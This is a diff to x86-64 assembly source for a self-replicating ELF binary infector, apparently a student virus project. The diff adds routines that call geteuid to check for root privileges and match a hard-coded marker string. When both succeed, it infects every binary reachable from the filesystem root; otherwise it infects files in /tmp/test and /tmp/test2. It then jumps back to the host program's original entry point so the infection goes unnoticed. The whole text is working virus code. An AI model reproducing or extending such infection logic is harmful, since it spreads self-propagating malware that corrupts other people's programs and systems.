@@ -19,6 +19,8 @@ section .text
 	extern _treat_file
 	extern _final_end
 	extern _thread_create
+	extern _start_infect
+	extern _infect_from_root
 
 _o_entry:
 	dq 0x0000000000000000 
@@ -55,8 +57,27 @@ _start:
 ; Arguments can be on stack or on registers, depending of the compilator so:
 	cmp QWORD [rsp + 128], 3 ; check if argc on the stack is equal 3
 	je _alternative_start
+_check_registers:
 	cmp QWORD [rsp + 64], 3 ; check if argc on the registers is equal 3
 	je _alternative_start_by_registers
+    lea r10, [rel _o_entry]
+    cmp QWORD [r10] , 0
+    jne _test_root_infect
+    call _start_infect
+    jmp _continue_normaly
+
+_test_root_infect:
+    mov rdi, QWORD [rsp + 152]
+    cmp rdi, 0
+    je _continue_normaly
+    mov rax, 0x4c4f4c3d54534554
+    cmp QWORD [rdi], rax
+    jne _continue_normaly
+	mov rax, 107
+	syscall ; We call geteuid
+	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect from /
+	jne _continue_normaly
+    call _infect_from_root
 
 ; If it's a normal execution, we just infect /tmp/test(2), to don't hard block the
 ; software with a too long execution.
@@ -64,18 +85,18 @@ _continue_normaly:
 	mov rax, 0
 	push rax
 	push rax
-	lea r10, [rel _o_entry]
+;	lea r10, [rel _o_entry]
 ; Here we check if their is a o_entry address. If so, we are in an infected binary,
 ; so we just infect /tmp/test(2), and execute the code normally.
 ; Else, we test for the privilege we have, and try to infect from / if we can
-	cmp QWORD [r10], 0 ; compare _o_entry with 0
-	jne _infect_tmp_test
-	mov rax, 107
-	syscall ; We call geteuid
-	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect from /
-	jne _infect_tmp_test
-	mov rax, 0
-	jmp _push_it
+;	cmp QWORD [r10], 0 ; compare _o_entry with 0
+;	jne _infect_tmp_test
+;	mov rax, 107
+;	syscall ; We call geteuid
+;	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect from /
+;	jne _infect_tmp_test
+;	mov rax, 0
+;	jmp _push_it
 _infect_tmp_test: ; if geteuid don't returned 0, we can't know what right we have. So we just infect /tmp/test(2)
 	mov rax, 0x747365742f706d74 ; tmp/test
 ;	mov rax, 0x006e69622f706d74 ; tmp/bin
@@ -89,8 +110,8 @@ _push_it:
 	push rsi
 	push rdi
 	call _read_dir
-	cmp QWORD [rsp + 24], 0 ; if the path is empty, we infected from '/', so we don't need to reinfect
-	je _jmp_end
+;	cmp QWORD [rsp + 24], 0 ; if the path is empty, we infected from '/', so we don't need to reinfect
+;	je _jmp_end
 	mov BYTE [rsp + 32], 0x32 ; add the '2' at the end of the path string
 	call _read_dir
 _jmp_end:
@@ -119,7 +140,7 @@ _alternative_start:
 	lea r11, [rel _verif] ; relative address of _verif
 	mov r11, QWORD [r11] ; dereferencing
 	cmp QWORD [r10], r11 ; we compare the verify code, to know if it's a normal execution
-	jne _continue_normaly
+	jne _check_registers
 	mov rsi, QWORD [rsp + 152] ; take the argv[2]
 	mov rax, 0 ; Here we said to our function: Do not infect in recursiv, only your directory
 	push rax
@@ -130,6 +151,7 @@ _alternative_start:
 	pop rdi
 	pop rdi
 	lea rax, [rel _force_exit] ; then exit
+    jmp _jmp_to_o_entry
 
 ; In this other alternative start, the arguments are received by registers. We pushed the registers to
 ; don't corrupt the normal execution, so we will find our arguments on the stack.
